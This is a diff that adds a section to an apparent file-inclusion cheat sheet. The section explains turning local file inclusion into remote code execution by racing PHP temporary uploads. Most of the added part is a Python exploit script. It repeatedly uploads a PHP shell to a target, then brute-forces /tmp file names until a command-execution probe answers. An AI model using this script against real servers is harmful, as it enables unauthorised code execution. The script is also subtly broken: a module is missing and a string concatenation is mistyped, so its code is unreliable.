@@ -16,6 +16,7 @@ The File Inclusion vulnerability allows an attacker to include a file, usually e
 * [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
 * [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
 * [LFI to RCE via upload](#lfi-to-rce-via-upload)
+* [LFI to RCE via upload (race)](#lfi-to-rce-via-upload-race)
 * [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
 * [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
 * [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
@@ -242,6 +243,38 @@ http://example.com/index.php?page=path/to/uploaded/file.png
 ```
 
 In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf
+
+## LFI to RCE via upload (race)
+
+* Upload a file and trigger a self-inclusion.
+* Repeat 1 a shitload of time to:
+* increase our odds of winning the race
+* increase our guessing odds
+* Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}
+* Enjoy our shell.
+
+```python
+import itertools
+import requests
+import sys
+
+print('[+] Trying to win the race')
+f = {'file': open('shell.php', 'rb')}
+for _ in range(4096 * 4096):
+    requests.post('http://target.com/index.php?c=index.php', f)
+
+
+print('[+] Bruteforcing the inclusion')
+for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
+    url = 'http://target.com/index.php?c=/tmp/php' + fname
+    r = requests.get(url)
+    if 'load average' in r.text:  # <?php echo system('uptime');
+        print('[+] We have got a shell: ' + url)
+        sys.exit(0)
+
+print('[x] Something went wrong, please try again')
+```
+
 
 ## LFI to RCE via phpinfo()
 
